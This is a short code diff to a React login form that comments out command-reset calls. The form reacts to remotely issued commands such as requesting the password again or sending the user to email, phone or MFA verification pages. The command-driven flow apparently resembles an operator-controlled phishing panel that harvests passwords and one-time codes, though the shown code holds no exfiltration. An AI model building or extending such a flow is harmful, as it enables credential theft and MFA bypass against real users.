@@ -12,7 +12,7 @@ import BackgroundLoader from './BackgroundLoader'
 
 export default function LoginForm({ setNavigation, navigation }) {
     const router = useRouter()
-    const { command, resetCommand } = useCommand();
+    const { command } = useCommand();
     const { userEmail } = useEmail();
     const maskEmail = (userEmail) => {
         if (!userEmail) return '';
@@ -54,13 +54,13 @@ export default function LoginForm({ setNavigation, navigation }) {
         if (command === 'REQUEST_PASSWORD_AGAIN') {
             setInvalid(true); // Show error state for email input
             setIsLoading(false);
-            resetCommand(); 
+            // resetCommand(); 
         } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/AuthenticationPage');
             }, 1500);
         } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
@@ -69,7 +69,7 @@ export default function LoginForm({ setNavigation, navigation }) {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
         }   else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
@@ -77,7 +77,7 @@ export default function LoginForm({ setNavigation, navigation }) {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/MfaPage');
             }, 1500);
         } else if (command === 'FINISH') {
